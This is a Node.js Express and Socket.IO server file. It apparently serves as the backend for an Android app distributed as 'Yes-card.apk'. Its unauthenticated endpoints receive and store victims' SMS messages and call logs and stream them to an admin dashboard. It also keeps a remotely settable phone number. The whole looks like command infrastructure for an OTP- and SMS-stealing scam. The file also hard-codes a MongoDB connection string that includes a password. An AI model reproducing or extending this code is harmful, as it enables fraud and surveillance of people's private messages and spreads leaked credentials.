const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const mongoose = require("mongoose");
const http = require("http");
const { Server } = require("socket.io");

const app = express();
const PORT = 3000;

/* =======================
   HTTP SERVER & SOCKET.IO
======================= */
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*" }
});

/* =======================
   MONGODB CONNECTION
======================= */
mongoose.connect("mongodb+srv://oosrp9132_db_user:BnixQ3Qdq7kPXBcG@cluster0.vez1b2n.mongodb.net/")
  .then(() => console.log("✅ MongoDB connected"))
  .catch(err => console.error("❌ MongoDB error:", err));

/* =======================
   SMS SCHEMA
======================= */
const SmsSchema = new mongoose.Schema({
  userId: { type: String, required: true }, // NEW: link to user,
  sender: { type: String, required: true },
  message: { type: String, required: true },
  receivedAt: { type: Date, default: Date.now }
});
const Sms = mongoose.model("Sms", SmsSchema);

/* =======================
   PHONE NUMBER SCHEMA
======================= */
const PhoneSchema = new mongoose.Schema({
  phone: { type: String, required: true },
});

const Phone = mongoose.model("Phone", PhoneSchema);

const CallLogSchema = new mongoose.Schema({
  userId: { type: String, required: true }, // NEW: link to user
  phone: { type: String },                  // device phone number (optional)
  number: { type: String, required: true }, // called / received number
  type: { type: String, enum: ["INCOMING", "OUTGOING", "MISSED"], required: true },
  duration: { type: String },
  date: { type: Number, required: true },   // timestamp from Android
  createdAt: { type: Date, default: Date.now }
});

const CallLog = mongoose.model("CallLog", CallLogSchema);



/* =======================
   MIDDLEWARE
======================= */
app.use(cors());
app.use(express.static("public"));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

/* =======================
   ROUTES
======================= */
// Test API
app.get("/", (req, res) => {
  res.send("✅ SMS API with MongoDB is running");
});

// Receive SMS + store in DB
app.post("/sms", async (req, res) => {
  const { userId, sender, message } = req.body;

  if (!userId || !sender || !message) {
    return res.status(400).json({ 
      success: false, 
      message: "Missing required fields: userId, sender or message" 
    });
  }

  try {
    const sms = new Sms({
      userId,   // store userId
      sender,
      message
    });
    await sms.save();

    console.log("📩 SMS Stored in MongoDB:", userId, sender, message);

    // 🔴 Emit the new SMS to all connected clients
    io.emit("new_sms", sms);

    res.json({ success: true, message: "SMS stored successfully" });
  } catch (err) {
    console.error("❌ Save failed:", err);
    res.status(500).json({ success: false, message: "Database error" });
  }
});


// View all messages
app.get("/sms", async (req, res) => {
  const messages = await Sms.find().sort({ receivedAt: -1 });
  res.json(messages);
});

app.get("/download-apk", (req, res) => {
  const filePath = __dirname + "/public/yes_card.apk";
  res.download(filePath, "Yes-card.apk");
});



// Save phone number (single)
app.post("/get-number", async (req, res) => {
  const { phone } = req.body;

  if (!phone) {
    return res.status(400).json({
      success: false,
      message: "Phone number required"
    });
  }

  try {
    let record = await Phone.findOne();

    if (record) {
      // Update existing number
      record.phone = phone;
      await record.save();
    } else {
      // Create new record
      record = await Phone.create({ phone });
    }

    console.log("📞 Phone saved:", phone);

    res.json({
      success: true,
      phone: record.phone
    });

  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});



// Get phone number directly
app.get("/get-number", async (req, res) => {
  const record = await Phone.findOne();

  if (!record) {
    return res.json({ phone: null });
  }

  res.json({ phone: record.phone });
});

/* =======================
   RECEIVE CALL LOG
======================= */
app.post("/call-log", async (req, res) => {
  const { userId, number, type, duration, date, phone } = req.body;

  console.log("Received call log:", userId, number, type);

  if (!userId || !number || !type || !date) {
    return res.status(400).json({
      success: false,
      message: "Missing required fields (userId, number, type, date)"
    });
  }

  try {
    // Avoid duplicates (same call timestamp + number + userId)
    const exists = await CallLog.findOne({ userId, number, date });
    if (exists) {
      return res.json({ success: true, message: "Already exists" });
    }

    const log = new CallLog({
      userId,
      phone: phone || null,
      number,
      type,
      duration,
      date
    });

    await log.save();

    console.log("📞 Call log saved:", userId, number, type);

    // Emit to admin dashboard
    io.emit("new_call_log", log);

    res.json({ success: true });

  } catch (err) {
    console.error("❌ Call log save error:", err);
    res.status(500).json({ success: false, message: "Server error" });
  }
});

/* =======================
   GET ALL CALL LOGS
======================= */
app.get("/call-logs", async (req, res) => {
  const logs = await CallLog.find().sort({ createdAt: -1 });
  res.json(logs);
});



/* =======================
   SOCKET.IO CONNECTION
======================= */
io.on("connection", (socket) => {
  console.log("🟢 Client connected:", socket.id);

  socket.on("disconnect", () => {
    console.log("🔴 Client disconnected:", socket.id);
  });
});

/* =======================
   START SERVER
======================= */
server.listen(PORT, () => {
  console.log(`🚀 Server running at http://localhost:${PORT}`);
});
